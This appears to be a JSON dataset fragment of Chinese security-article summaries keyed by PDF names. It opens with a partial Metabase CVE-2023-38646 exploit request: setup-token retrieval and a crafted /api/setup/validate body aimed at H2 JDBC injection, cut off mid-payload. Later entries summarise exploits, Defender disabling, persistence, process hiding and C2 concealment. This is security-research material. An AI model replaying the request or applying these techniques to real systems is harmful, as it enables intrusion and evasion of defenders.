        "page_content": "该漏洞是由于 Metabase 未授权获取了 token 导致我们可以重置 jdbc 的 url 连接，我们可以进⾏ H2 RCE 来进⼀步利⽤。该漏洞始于⼀ 个未授权访问，根据 github 的 diff 可以发现 在新版本中删除了上⼀个版本中残余的 setup-token ，假如我们获取了 token 我们可以访问 \t /validate \t 路由对 jdbc 进⾏校验，⽽ jdbc 校验的时候就造成了 JDBC 注⼊， metabase 是基于 H2 数据库的，所以利⽤⾯很⼴ 我们⾸先可以访问 \t [http://localhost:3000/api/session/properties] (http://localhost:3000/api/session/properties) \t 获取 setup-token 前⾔ 环境搭建 漏洞简介 漏洞分析然后构造以下恶意包。 POST\t/api/setup/validate\tHTTP/1.1 Host:\tlocalhost:3000 User-Agent:\tMozilla/5.0\t(Windows\tNT\t10.0;\tWin64;\tx64;\trv:109.0)\tGecko/20100101\tFirefox/117.0 Accept:\ttext/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language:\tzh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding:\tgzip,\tdeflate Connection:\tclose Cookie:\tmetabase.DEVICE=b4a0ad02-dacb-4b2a-a39d-cf6a2d613533;\t_ga=GA1.1.1767171371.1694851001;\t_gid=GA1.1.502142343.1694851001;\t_gat=1 Upgrade-Insecure-Requests:\t1 Content-Type:\tapplication/json Content-Length:\t17244 { \t\t\t\t\"token\":\t\"9b596984-8a65-48a6-9f3b-2561bfb2a052\", \t\t\t\t\"details\": \t\t\t\t{ \t\t\t\t\t\t\t\t\"is_on_demand\":\tfalse, \t\t\t\t\t\t\t\t\"is_full_sync\":\tfalse, \t\t\t\t\t\t\t\t\"is_sample\":\tfalse, \t\t\t\t\t\t\t\t\"cache_ttl\":\tnull, \t\t\t\t\t\t\t\t\"refingerprint\":\tfalse, \t\t\t\t\t\t\t\t\"auto_run_queries\":\ttrue, \t\t\t\t\t\t\t\t\"schedules\": \t\t\t\t\t\t\t\t{}, \t\t\t\t\t\t\t\t\"details\": \t\t\t\t\t\t\t\t{ \t\t\t\t\t\t\t\t\t\t\t\t\"db\":\t\"zip:E:/CTFLearning/metabase.jar!/sample-database.db;MODE=MSSQLServer;\", \t\t\t\t\t\t\t\t\t\t\t\t\"advanced-options\":\tfalse, \t\t\t\t\t\t\t\t\t\t\t\t\"ssl\":\ttrue,\n```",
        "FileName": "12901-Metabase RCE 内存马构造及GUI工具（CVE-2023-38646）.pdf"
    },
    {
        "page_content": "先知社区是一个安全技术交流平台，鼓励原创研究和分享。投稿须知规定了投稿方式和要求，包括使用 Markdown 格式、上传图片和附件到社区文件存储，以及稿件类型和评分标准。原创稿件可获得现金奖励，翻译稿件也可获得奖励。社区还设有自由讨论板块，用于分享安全技术信息和提问。",
        "FileName": "11780-社区投稿须知.pdf"
    },
    {
        "page_content": "该文档详细介绍了以太坊虚拟机 (EVM) 中智能合约变量的存储机制，包括值类型（如布尔型、整数型）、引用类型（如数组、映射）、结构体和字符串。文档还提供了存储优化原则，并通过示例合约展示了不同变量类型的存储方式。",
        "FileName": "9837-智能合约变量储存机制详解.pdf"
    },
    {
        "page_content": "该文档分析了V8中一个远程代码执行漏洞的利用，该漏洞是由一个偶然发现的崩溃报告引起的。该漏洞存在于VirtualObject::MergeFields函数中，该函数是Turbofan JIT的逃逸分析阶段。分析表明，漏洞是由函数错误计算类型引起的，导致攻击者控制的值的类型与已编译函数期望的类型不同。利用该漏洞，攻击者可以读写超出数组边界的部分，从而实现越界读写。通过覆盖相邻数组的length值，攻击者可以创建addr_of和fake_obj，从而实现任意代码执行。该漏洞已通过在Chrome和V8中引入W^X被修复，但仍存在实现任意代码执行的其它方式，例如RWX WASM页面和ROP。",
        "FileName": "7502-一个V8上的远程代码执行漏洞利用.pdf"
    },
    {
        "page_content": "该文档探讨了花式栈溢出和栈帧调节技术，重点介绍了通过修改 ESP 值和使用 Stack Migration 来控制栈指针，从而解决栈溢出程序中可控字节数不足或 ASLR 保护导致栈地址不可预测等问题。",
        "FileName": "7216-花式栈溢出（栈帧的调节）.pdf"
    },
    {
        "page_content": "该文档的主题和内容是关于 CVE-2020-14364 漏洞的分析和利用。\n\n**漏洞分析**\n\n该漏洞存在于 QEMU 中的 USB 设备仿真中。当 USB 设备被初始化时，QEMU 会为该设备分配一个 EHCIState 结构。该结构包含一个名为 opreg 的字段，其中包含设备的寄存器映射。\n\n漏洞点在于 do_token_setup 函数中，该函数在处理 USB 设备的 SETUP 请求时，会将请求中的数据复制到 opreg 缓冲区中。由于 opreg 缓冲区的长度没有经过适当的检查，攻击者可以利用此漏洞覆盖 opreg 缓冲区中的任意数据，从而导致任意代码执行。\n\n**漏洞利用**\n\n为了利用该漏洞，攻击者需要执行以下步骤：\n\n1. 通过 mmio_write 函数映射到 USB 设备的内存。\n2. 设置漏洞触发环境，包括设置 opreg 缓冲区的长度和 USB 设备的初始化。\n3. 利用 do_token_setup 函数中的漏洞，覆盖 opreg 缓冲区中的数据。\n4. 执行任意代码。\n\n**影响范围**\n\n该漏洞影响 QEMU 4.2.1 及更早版本。\n\n**修复建议**\n\n已发布 QEMU 4.2.2 版本来修复该漏洞。建议用户升级到最新版本的 QEMU。",
        "FileName": "8320-CVE-2020-14364-Qemu逃逸漏洞分析及两种利用思路.pdf"
    },
    {
        "page_content": "AWS VPN 客户端中存在两个漏洞，CVE-2022-25166 允许以 SYSTEM 权限写入任意文件，而 CVE-2022-25165 则允许通过 UNC 路径泄露用户的 Net-NTLMv2 哈希。这些漏洞影响版本 2.0.0，已在版本 3.0.0 中修复。",
        "FileName": "11485-CVE-2022-25165：AWS VPN 客户端中的 SYSTEM 权限提升.pdf"
    },
    {
        "page_content": "该文档分析了基于 Java Filter 的内存马，它通过拦截 Servlet 请求中的参数来执行恶意函数。通过分析 Tomcat 的 Filter 加载过程，文档展示了如何通过反射创建 Filter 对象并将其添加到 Filter 链中，从而在不修改 XML 配置的情况下实现内存马。",
        "FileName": "10888-java Filter内存马分析.pdf"
    },
    {
        "page_content": "该文档分析了 PHP 中的 UAF 漏洞，该漏洞存在于 SplDoublyLinkedList 类中，允许攻击者通过构造函数和析构函数访问和修改链表元素，从而导致 UAF。文档提供了利用该漏洞的脚本，该脚本使用链表元素的引用计数和 zval 格式的数据来泄露地址数据，并最终执行系统命令。",
        "FileName": "8355-通过UAF bypass PHP disabled functions.pdf"
    },
    {
        "page_content": "CSRF（跨站请求伪造）攻击是一种劫持受信任用户向服务器发送非预期请求的攻击方式，攻击者利用用户的身份信息，以用户的名义发送恶意请求，对服务器来说这个请求是你发起的，却完成了攻击者所期望的操作，如修改用户信息、密码等。CSRF攻击的原理是利用浏览器自动携带Cookie访问第三方网站，而服务器端未对请求做合法性验证，导致攻击者构造的恶意代码有机会执行，从而达到模拟用户操作的目的。",
        "FileName": "8186-CSRF攻击技术浅析.pdf"
    },
    {
        "page_content": "该文档分析了某电商网站优惠券无限领取漏洞，该漏洞允许攻击者通过枚举优惠券编号或使用自动化工具大量领取优惠券，从而造成商家经济损失。为了防止此类漏洞，网站应采用其他验证方法，如 IP 地址或验证码，以避免通过遍历方式领取优惠券。",
        "FileName": "12560-某电商网站的优惠券无限领取漏洞.pdf"
    },
    {
        "page_content": "本文档讨论了在 Windows 系统上利用 Redis 获取 shell 的方法，由于 Windows 的启动项和计划任务不是以文本形式保存在固定位置，因此传统的 Linux 上的 getshell 方法不可行。作者介绍了 RedisWriteFile 工具，该工具利用 Redis 的主从同步写数据，可以实现写入无损文件。此外，作者还介绍了其他方法，如利用 startup 目录、系统 DLL 劫持、MOF 文件等，但这些方法都有一定的局限性。总体而言，Windows 上的 Redis getshell 还没有发现一招通杀的方法，需要根据具体情况尝试不同的方法。",
        "FileName": "7940-踩坑记录-Redis(Windows)的getshell.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2020-8835 漏洞，该漏洞允许攻击者通过任意读写操作提升权限。文档详细介绍了漏洞利用思路，包括通过任意读泄露内核地址、修改 map 字段绕过检查、填充伪造的 array_map_ops、任意写内存以及修改进程 cred 进行提权。",
        "FileName": "7690-CVE-2020-8835 pwn2own 2020 ebpf 通过任意读写提权分析.pdf"
    },
    {
        "page_content": "该文档分析了名为“彩虹猫”的恶意软件，该软件使用 C++ 编写，未加壳。它创建多个进程，并根据参数执行不同的操作。如果参数小于或等于 1，它会弹出两个窗口，分配堆内存并获取进程路径。如果参数大于 1，它会遍历进程，检查是否已终止，并调用一个子函数来重启进程。该子函数创建 20 个线程并调用关机函数。文档还附上了一个 IDA 分析数据库和一个执行流程图。",
        "FileName": "9328-小白对彩虹猫的简单分析.pdf"
    },
    {
        "page_content": "该文档介绍了一种低配版的 Linux 下 Java 反序列化通杀回显方法，通过获取 socket 文件描述符，在文件描述符中写入回显内容，实现带内回显。该方法的优点是无需指定请求端端口，但缺点是无法在反代后或不可预测源端端口的情况下使用。",
        "FileName": "7307-linux下java反序列化通杀回显方法的低配版实现.pdf"
    },
    {
        "page_content": "该文档介绍了如何关闭 Windows Defender 防病毒软件，包括使用注册表、命令行工具和第三方工具的方法。它还提供了有关 TrustedInstaller 权限、排除项和实时保护的详细信息。",
        "FileName": "12280-致盲 Windows defender.pdf"
    },
    {
        "page_content": "**文档主题：** CVE-2022-0995 Linux kernel  观测队列⼦系统堆溢出漏洞分析\n\n**文档内容：**\n该漏洞是由内核版本 5.8 中引入的，在 5.17-rc7 版本中被修复。该漏洞允许攻击者通过向 watch queue event notification 子系统发送精心构造的消息来触发堆溢出，从而导致任意代码执行。该漏洞的严重性评级为 7.1，被认为是高危漏洞。\n\n**漏洞分析：**\n该漏洞存在于 watch queue 子系统中，该子系统负责将通知消息从内核传递到用户空间。攻击者可以通过向该子系统发送精心构造的消息来触发堆溢出，从而导致任意代码执行。\n\n**漏洞利用：**\n攻击者可以利用该漏洞在受影响的系统上执行任意代码。该漏洞的利用需要以下步骤：\n\n1. 向 watch queue event notification 子系统发送精心构造的消息。\n2. 触发堆溢出。\n3. 执行任意代码。\n\n**漏洞修复：**\n该漏洞已在内核版本 5.17-rc7 中修复。受影响的用户应尽快更新到最新版本的内核。",
        "FileName": "11168-CVE-2022-0995 Linux kernel 观测队列子系统堆溢出漏洞分析.pdf"
    },
    {
        "page_content": "本文探讨了命令混淆技术，介绍了利用特殊符号、环境变量、for循环、powershell和工具来绕过检测，并提供了用于收集主机信息、横向移动和查找密码的实用命令。",
        "FileName": "10699-浅谈命令混淆.pdf"
    },
    {
        "page_content": "DarkAngel 是一款全自动白帽漏洞扫描器，它可以从 HackerOne 和 Bugcrowd 资产监听漏洞报告生成，并通过企业微信通知。它支持自定义资产添加、子域名扫描、网站指纹识别、漏洞扫描、漏洞报告自动生成和企业微信通知扫描结果。",
        "FileName": "11958-DarkAngel - 全自动白帽漏洞扫描器.pdf"
    },
    {
        "page_content": "该文档详细分析了恶意 APK 利用恶意 WiFi 攻击窃取用户 cookie 的过程，攻击者通过劫持域名并设置 captive-portal-login，诱导用户连接恶意 WiFi 并打开特定 APP，从而获取用户 cookie 并通过计算签名调用接口，窃取用户个人信息，包括手机号、收货地址、性别、生日等敏感信息。",
        "FileName": "9145-记一次某APK的恶意WIFI攻击.pdf"
    },
    {
        "page_content": "该文档分析了杀毒软件和端点检测和响应 (EDR) 的主题，讨论了驱动开发原理、杀毒软件/EDR 监控拦截原理，并编写了一个简单的驱动程序来实现杀毒软件/EDR 对某些行为的拦截。",
        "FileName": "12881-白驱动 Kill AVEDR（上）.pdf"
    },
    {
        "page_content": "该文档分析了 Thinkphp 5.0.15 版本中的 SQL 注入漏洞，该漏洞存在于 insert() 函数中，当输入数据包含数组时，会将数组中的值拼接成 SQL 语句，导致注入攻击。漏洞的利用需要满足特定的条件，例如输入数据必须是一个数组，并且数组的第一个元素必须是 \"inc\" 或 \"dec\"。文档还提供了漏洞的修复原理，即在更新后的版本中，对输入数据进行了判断，只有当输入值与数据库字段值相等时才会进行拼接，从而修复了注入问题。",
        "FileName": "9266-Thinkphp 5.0.15 SQL注入漏洞挖掘分析.pdf"
    },
    {
        "page_content": "CVE-2021-1732 win32k 漏洞分析文档分析了 CVE-2021-1732 win32k 漏洞，该漏洞存在于 win32kfull!xxxCreateWindowEx 函数中，由于 Type Confusion 漏洞，利⽤此漏洞进⾏越界读写，最终可实现本地提权。",
        "FileName": "11021-CVE-2021-1732 win32k漏洞分析.pdf"
    },
    {
        "page_content": "该文档详细分析了 LNK 文件格式，包括其结构、标志和字段。它还提供了如何构造迷惑性 LNK 文件的逐步说明，该文件可以绕过安全措施并执行恶意代码。",
        "FileName": "8062-LNK文件格式解析及伪装.pdf"
    },
    {
        "page_content": "本文探讨了原型链污染的扩展思考，并以 js-xss HTML 过滤器为例，展示了如何通过污染过滤器中的白名单属性来绕过过滤，实现 XSS 攻击。此外，文章还分析了 jQuery、Zepto 和 Sprint 等 JavaScript 库中的原型链污染漏洞，并提供了相应的测试代码和触发机制。",
        "FileName": "8552-Prototype Pollution扩展思考.pdf"
    },
    {
        "page_content": "该文档重点介绍了针对挖矿攻击的检测和防御策略，包括基于流量特征和主机行为的检测方法，以及针对被动和主动挖矿的防御措施。文档还提供了攻击链路检测、信息收集、执⾏、权限维持、防御规避和横向移动等方面的技术细节，并强调了掌握主动权和了解攻击者未知环境的重要性。",
        "FileName": "11102-对于挖矿的检测以及防御方案.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2022-22947 漏洞，该漏洞是 SpringCloud GateWay 中的一个 SPEL 远程代码执行漏洞。漏洞的触发点在于 org.springframework.cloud.gateway.support.ShortcutConfigurable#getValue 函数中的 SPEL 注入，攻击者可以通过添加包含恶意 SPEL 表达式的路由来执行任意代码。",
        "FileName": "11004-CVE-2022-22947 SpringCloud GateWay SPEL RCE分析.pdf"
    },
    {
        "page_content": "该文档提供了针对攻防演练的防御方应急响应流程，包括检查端⼝、进程、启动项、服务、事件日志、临时文件、快捷方式、系统变量、会话、补丁信息、隐藏用户、可疑文件、第三方软件漏洞、文件修改时间、异常流量、弱口令和远程端⼝开放情况。此外，还提供了系统被入侵后的后续处理建议，如重新安装系统、修改密码、修改远程桌面端⼝、配置安全组防火墙和定期备份数据。",
        "FileName": "7890-Hw-应急响应Windows系列.pdf"
    },
    {
        "page_content": "该文档分析了 HYBBS 论坛系统中的多个安全漏洞，包括任意文件写入漏洞、目录删除漏洞、任意文件上传漏洞和 XSS 漏洞。这些漏洞允许攻击者在系统上执行任意代码、删除文件、上传恶意文件和执行跨站点脚本攻击。",
        "FileName": "10072-HYBBS审计.pdf"
    },
    {
        "page_content": "Mantis BT 是一个 BUG 管理系统，CVE-2017-7615 漏洞影响 MantisBT2.3.0 及之前的版本，攻击者可通过向 verify.php 文件传递空的 confirm_hash 值利用该漏洞重置任意密码，获取管理员访问权限。该漏洞涉及密码重置和认证后命令执行两个方面，攻击者可通过重置密码获取管理员权限，再通过配置选项设置执行任意命令。",
        "FileName": "11592-Mantis BT  CVE-2017-7615任意密码重置+认证后RCE漏洞分析.pdf"
    },
    {
        "page_content": "该文档分析了 Windows 环境中的持久化技术，包括 Startup 目录、注册键、服务、计划任务、WMI、屏幕保护、后台智能传输服务、后台打印程序服务、Netsh、AppCertDlls 和 MSDTC。这些技术允许攻击者在获得 shell 或钓到鱼后保持对系统的访问权限，即使系统重新启动或用户注销。",
        "FileName": "8095-Windows权限维持技术整理.pdf"
    },
    {
        "page_content": "该文档详细描述了作者如何利用简单的技术渗透某高校，包括获取 VPN 访问权限、寻找内网跳板、横向移动、收集敏感信息以及访问核心数据库。作者强调了学校网络安全建设中存在的薄弱环节，并提出了加强安全措施的建议。",
        "FileName": "11186-[有手就行]半天打穿某高校.pdf"
    },
    {
        "page_content": "该文档分析了 D3CTF2022 中的一道 kernel pwn 题，介绍了一种利用 CVE-2021-22555 的堆喷 msg_msg 和 sk_buff 的解法，该解法成功率更高、稳定性更强。",
        "FileName": "11370-D3CTF2022 - Pwn - d3kheap 题解.pdf"
    },
    {
        "page_content": "本文档详细分析了 Fastjson 反序列化 RCE 核⼼的四个关键点：词法解析、构造⽅法选择、缓存绕过和反射调⽤。词法解析负责将 JSON 数据转换成 Fastjson 可以理解的格式，构造⽅法选择决定了 Fastjson 如何实例化 Java 对象，缓存绕过允许攻击者绕过 Fastjson 的安全检查，反射调⽤允许攻击者执⾏任意 Java 代码。了解这些关键点对于理解 Fastjson 反序列化 RCE 漏洞至关重要。",
        "FileName": "7107-Fastjson反序列化RCE核心-四个关键点分析.pdf"
    },
    {
        "page_content": "PyYaml 反序列化漏洞是一种安全漏洞，它允许攻击者通过在 YAML 数据中注入恶意代码来执行任意代码。该漏洞存在于 PyYaml 库中，该库用于在 Python 和 YAML 格式之间转换数据。攻击者可以通过利用 !!python/object、!!python/object/apply、!!python/module 和 !!python/name 等标签来执行恶意代码。PyYaml <= 5.1 版本特别容易受到此漏洞的影响，但较新版本也可能受到影响。",
        "FileName": "12481-PyYaml反序列化漏洞详解.pdf"
    },
    {
        "page_content": "本文档概述了 JavaScript 安全中的 AST 混淆技术，包括其主题、内容、常用混淆方法、编码格式、常量加密、数组混淆、JSfuck、花指令、控制流平坦化、逗号表达式、自动化混淆方案、AST 混淆原理、AST 混淆器、指定行加密、去注释、动态混淆技术和参考链接。",
        "FileName": "10869-js安全之ast混淆.pdf"
    },
    {
        "page_content": "该文档分析了 PHP 文件上传流量层面的 WAF 绕过技巧，包括前向截断、后向截断、忽略转义字符和覆盖变量值等，这些技巧可以绕过 PHP 文件上传的 WAF 保护，从而实现恶意文件上传。",
        "FileName": "11486-PHP文件上传流量层面WAF绕过.pdf"
    },
    {
        "page_content": "本文档分析了 CobaltStrike 中 Beacon C2Profile 的解析过程，包括 Controller 端和 Beacon 端的实现。Controller 端通过添加数据类型和数据长度来构建 C2Profile，而 Beacon 端通过循环解析 C2Profile，根据数据类型提取相应的数据，并将其存储在指定的位置。C2Profile 在 CobaltStrike 中用于配置 Beacon 的行为，并作为检测 CobaltStrike 的一种手段。",
        "FileName": "10785-CobaltStrike逆向学习系列(3)：Beacon C2Profile 解析.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何调试 Tenda AC15 路由器固件中的栈溢出漏洞 (CVE-2018-5767)，该漏洞存在于 GoAhead 2.1.8 框架的 R7WebsSecurityHandler 函数中。文档提供了漏洞分析、仿真模拟、绕过限制和利用漏洞的详细步骤，包括使用 ROP 技术执行任意命令。",
        "FileName": "7357-cve-2018-5767 Tenda AC15 栈溢出漏洞调试.pdf"
    },
    {
        "page_content": "本文档介绍了在阿里云伏魔引擎多功能场景中绕过任意文件读取和写入限制的三种思路：寻找不常见的文件相关类或方法、利用漏洞和强制绕过常见文件读写函数。具体方法包括利用 highlight_file 和 show_source 读取文件，利用 ZipArchive 类读写文件，利用 XMLWriter 类写入文件，利用 SplFileInfo 类读取文件，利用 DOMDocument::xinclude 读取文件，利用 XXE 漏洞读取文件，利用 SSRF 漏洞读取文件，以及利用 iconv_mime_decode、iconv_mime_decode_headers 和 file 函数强制绕过文件读写限制。",
        "FileName": "12089-记一次阿里云伏魔引擎-多功能场景绕过测试.pdf"
    },
    {
        "page_content": "该文档介绍了在 Linux 系统中隐藏进程和网络信息的两种方法。第一种方法通过修改内核设置和编译 ps 源码来隐藏进程信息，而第二种方法通过 hook readdir 和 sscanf 函数来隐藏进程和网络信息，从而使 ps 和 netstat 等工具无法检测到隐藏的进程和监听端口。",
        "FileName": "11536-linux下进程隐藏的一些研究.pdf"
    },
    {
        "page_content": "该文档分析了 jumpserver 远程代码执行漏洞，该漏洞允许未经身份验证的攻击者通过 websocket 连接执行任意命令。攻击者可以通过获取一个 20 秒的令牌来利用此漏洞，该令牌可用于连接到 websocket 并发送命令。该漏洞是由于 jumpserver 代码中缺少身份验证检查造成的。",
        "FileName": "9037-jumpserver远程代码执行漏洞分析.pdf"
    },
    {
        "page_content": "DedeCMS-V5.7.91-UTF8 后台 story_books.php 存在 XSS 漏洞，该漏洞允许攻击者通过注入恶意脚本或标签来执行任意代码。漏洞的根源在于 $keyword 变量未经过适当的过滤和转义，导致其可以包含恶意内容并被嵌入到 SQL 查询中。修复建议包括过滤特殊字符、使用预定义函数、进行输入验证和输出编码。",
        "FileName": "12436-DedeCMS-V5.7.91-UTF8后台story_books.php存在XSS漏洞.pdf"
    },
    {
        "page_content": "该文档分析了 Laravel Debug 模式中的一个远程代码执行漏洞（CVE-2021-3129），该漏洞允许攻击者通过触发 phar 反序列化来执行任意代码。漏洞的根源在于 Ignition 解决方案中过滤不严谨，导致攻击者可以通过修改视图变量来写入恶意 phar 文件，并通过 file_get_contents() 函数触发 phar 反序列化。",
        "FileName": "9030-Laravel Debug mode RCE（CVE-2021-3129）分析复现.pdf"
    },
    {
        "page_content": "WebSocket 协议是一种双向通信协议，它通过单个 TCP 连接实现客户端和服务器之间的通信，并提供 HTTP 轮询的替代方案。该协议旨在解决 HTTP 作为传输层时的效率和可靠性问题，并通过结合 WebSocket API 为从网页到远程服务器的双向通信提供支持。",
        "FileName": "11962-WebSocket通信安全概览.pdf"
    },
    {
        "page_content": "该文档探讨了如何利用存储型 XSS 漏洞从本地存储中获取数据，包括用户名和密码等凭证。通过构造恶意 payload，攻击者可以检索本地存储中的 Bearer Token，从而绕过基于 cookie 的身份验证并接管组织。",
        "FileName": "10153-XSS漏洞_从本地存储中获取数据.pdf"
    },
    {
        "page_content": "该文档介绍了一款云平台攻击自动化工具，集成了丰富的 AK/SK 利用功能，可帮助红队快速获取目标云上资源信息，方便深入测试。该工具支持腾讯云、七牛和阿里云，提供 AK/SK 添加、命令执行、存储桶文件操作、数据库管理和控制台用户创建等功能，操作界面 WEB 化，方便资产管理和 AK/SK 管理。",
        "FileName": "12543-AKSK泄露利用工具WEB版.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 PAM（可插拔认证模块）在 Linux 系统中实现权限维持。通过修改 PAM 认证模块的代码逻辑，攻击者可以配置系统在输入特定密码（例如 \"goodboy\"）时授予 root 权限，并记录管理员的登录信息。",
        "FileName": "8618-内网技巧-Linux权限维持之PAM万能密码登录.pdf"
    },
    {
        "page_content": "该文档详细介绍了作者在综合靶场实战渗透中的步骤和方法，包括利用 SQL 注入获取第一个 flag、利用命令执行漏洞获取第二个 flag、通过文件上传获取第三个 flag、通过端⼝转发和全局代理访问内⽹环境获取第四个 flag、在管理员桌⾯上找到第五个 flag。",
        "FileName": "7193-记一次综合靶场实战渗透.pdf"
    },
    {
        "page_content": "该文档详细介绍了 Jira 环境的搭建过程，并分析了 CVE-2021-26086 漏洞的原理。文档重点介绍了受限文件读取漏洞的利用过程，包括 URL 重写过滤器、Jira 登录过滤器和请求转发机制的分析。此外，文档还提供了漏洞修复建议，强调了在请求转发时进行 URL 过滤的重要性。",
        "FileName": "10922-jira环境搭建及受限文件读取原理和深思CVE-2021-26086.pdf"
    },
    {
        "page_content": "HTTP 请求夹带是一种攻击技术，它利用了前端和后端服务器对同一请求的理解不一致。攻击者发送一个模糊的请求，该请求会被前端服务器解析为两个不同的 HTTP 请求，第二个请求会绕过正常的安全检查，从而使攻击者可以未经授权访问敏感数据。HTTP 请求夹带的产生原因是前端的反向代理服务器和后端的 Web 服务器对同一请求的理解不一致。",
        "FileName": "11728-关于HTTP Request Smuggling（HTTP请求夹带）的二三事.pdf"
    },
    {
        "page_content": "本文档探讨了内容安全策略 (CSP) 的概念，它是一种浏览器扩展程序系统，用于缓解跨站脚本问题。CSP 允许开发者创建和强制执行规则，管理网站加载的内容。文档详细介绍了 CSP 的语法、策略指令和绕过技术，例如 location 绕过、iframe 绕过、站点可控静态资源绕过、base-uri 绕过、SVG 绕过、不完整脚本标签绕过、meta 网页跳转绕过和 CRLF 绕过。",
        "FileName": "7372-csp绕过姿势.pdf"
    },
    {
        "page_content": "本文讲述了作者如何通过分析 Facebook 资产子域名发现 SSRF 漏洞，并通过一系列技术手段，包括枚举任务 ID、利用短网址生成器和探测内部网络，最终获得 Facebook 31500 美元的漏洞赏金。",
        "FileName": "7866-Bug Bounty $31500 Facebook SSRF挖掘之旅.pdf"
    },
    {
        "page_content": "本文介绍了一种利用 Nginx、Tyk Gateway API 和 CloudFlare 防火墙隐藏 Cobalt Strike C2 设施的方法。通过配置 Nginx 过滤不符合规则的请求，并通过配置 CloudFlare 防火墙只允许 Tyk Gateway API 的流量访问 C2 域名，可以达到隐藏 C2 域名，并防止搜索引擎、空间测绘扫描和识别 Cobalt Strike 特征导致域名或 IP 被标记。",
        "FileName": "11662-利用Nginx、Tyk Gateway API和CloudFlare防火墙隐藏C2设施.pdf"
    },
    {
        "page_content": "本文探讨了 N1QL 注入，这是一种 NoSQL 数据库中的 SQL 注入，并介绍了 N1QLMap 工具，该工具可用于验证 N1QL 注入漏洞，枚举数据存储、键空间和执行任意 N1QL 查询，甚至执行 SSRF 攻击。",
        "FileName": "8340-Couchbase Server  与 N1QL注入.pdf"
    },
    {
        "page_content": "该文档介绍了如何从废弃接口中寻找漏洞，包括使用 OneForAll 工具收集 IP 地址、使用 fscan 工具扫描 IP 地址、使用 JSFinder 工具扫描 URL、提取包含参数的 URL 以及使用 sqlmap 批量扫描 URL。该文档还提供了常见敏感接口和跳转参数的示例。",
        "FileName": "9833-信息收集组合拳之从废弃接口中寻找漏洞.pdf"
    },
    {
        "page_content": "本文介绍了如何绕过 BeaconEye 对 CobaltStrike Beacon 的检测。BeaconEye 使用 yara 规则检测 Beacon，这些规则匹配 Beacon 的 C2Profile。本文提供了两种绕过方法：修改 C2Profile 结构或使用 HOOK。修改 C2Profile 结构涉及替换中间值，而 HOOK 涉及修改解析 C2Profile 和取值函数。本文还提供了 X64 和 X86 架构的偏移量，以方便 HOOK。",
        "FileName": "10832-CobaltStrike逆向学习系列(5)：Bypass BeaconEye.pdf"
    },
    {
        "page_content": "该文档分析了 Weblogic CVE-2020-2551 漏洞的网络问题，并介绍了如何通过修改 IIOP 协议来解决该问题。该漏洞利用了 Weblogic IIOP 协议默认开启且监听在 7001 或其他端口的特性，以及 Weblogic IIOP 协议漏洞是首次出现且修复不及时的问题。文档还提供了完整的 POC 代码和攻击流程分析，并针对在不同网络环境下攻击 Weblogic Docker 的问题提出了解决方案。",
        "FileName": "7498-手把手教你解决Weblogic CVE-2020-2551 POC网络问题.pdf"
    },
    {
        "page_content": "本文深入分析了 OGNL 漏洞，介绍了 OGNL 的基本使用方式、符号的用法、命令执行调试分析以及近期三个 OGNL 漏洞（Confluence CVE-2021-26084、Struts2 CVE-2020-17530 和 Apache Unomi CVE-2020-13942）的分析，并总结了 OGNL 漏洞的修复思路和思考。",
        "FileName": "10482-一文读懂OGNL漏洞.pdf"
    },
    {
        "page_content": "该文档详细介绍了在 Kali 环境中搭建和利用 Atlassian Jira 的过程，包括环境搭建、配置数据库连接、分析数据库表结构、利用漏洞进行未授权用户枚举、模板注入 RCE、MyGroovy 插件 getshell 等。",
        "FileName": "11491-记一次Jira的搭建和相关利用.pdf"
    },
    {
        "page_content": "该文档分析了 XX 文库系统中的四个漏洞，包括文件上传、代码执行、路径穿越和文件下载。这些漏洞都是通过功能点分析发现的，包括添加 PHP 后缀、配置插马、跨目录下载和删除文件。文档还提供了漏洞的分析和调试过程，并建议提交 CNVD。",
        "FileName": "10988-XX文库系统漏洞审计.pdf"
    },
    {
        "page_content": "本文讨论了在移动应用程序安全渗透测试中遇到的安全机制问题和绕过方法，包括 iOS/安卓系统的信任机制、APK的SSL证书绑定、SSL双向校验和代理检测。文中介绍了反编译APK、使用自定义CA、注入动态库、hook证书验证函数、使用Xposed模块和绕过双向校验等具体绕过方法，并提供了相关工具和参考链接。",
        "FileName": "7470-APP测试之安全机制问题及Bypass.pdf"
    },
    {
        "page_content": "该文档分析了华为 HG532 路由器中的远程命令执行漏洞 (CVE-2017-17215)，该漏洞允许攻击者通过提交恶意构造的 XML 请求来执行任意命令。文档详细介绍了漏洞的复现过程，包括解压固件、搭建虚拟机、修改 IP 地址和使用 POC 进行命令注入。此外，文档还讨论了漏洞原理、进一步思考和参考链接。",
        "FileName": "8494-华为路由器漏洞CVE-2017-17215复现分析.pdf"
    },
    {
        "page_content": "该文档讨论了阿里云先知社区中个人信息的维护，重点关注稿费接收信息和昵称维护。对于稿费接收信息，作者必须在个人设置中填写姓名、身份证号码和支付宝收款账号，否则无法收到稿费。对于昵称维护，由于不可抗力，用户无法自行更新昵称，但可以在个人设置中备注新昵称，系统审核后会自动修改。",
        "FileName": "11781-关于社区个人信息的维护.pdf"
    },
    {
        "page_content": "本文档分析了 GEEKPWN2020- 云安全挑战赛决赛 -baby_kernel 题目的主题和内容。该题目是一个 ebpf 漏洞，利用了 bpf 指令检测的不足，通过一系列操作绕过检测，实现任意读写和越界写，最终导致任意命令执行。文档详细介绍了漏洞的原理、利用过程和影响，并提供了相应的修复建议。",
        "FileName": "8463-GEEKPWN2020-云安全挑战赛决赛-baby_kernel题解.pdf"
    },
    {
        "page_content": "LLVM是一个模块化、可重用的编译器和工具链技术集合，它采用三段式设计，包括前端、优化器和后端。LLVM的优点包括模块化、统一的中间代码IR、强大的Pass系统以及广泛的子项目，如Clang、LLDB和Libc++。",
        "FileName": "7257-初探LLVM&clang&pass.pdf"
    },
    {
        "page_content": "这篇文档详细介绍了如何进行企业钓鱼演练，包括搭建钓鱼平台、配置邮件服务器、整合钓鱼网站和邮件内容，以及如何追踪和分析钓鱼结果。该演练旨在提高员工的安全意识，识别和预防网络钓鱼攻击。",
        "FileName": "11400-记一次企业钓鱼演练.pdf"
    },
    {
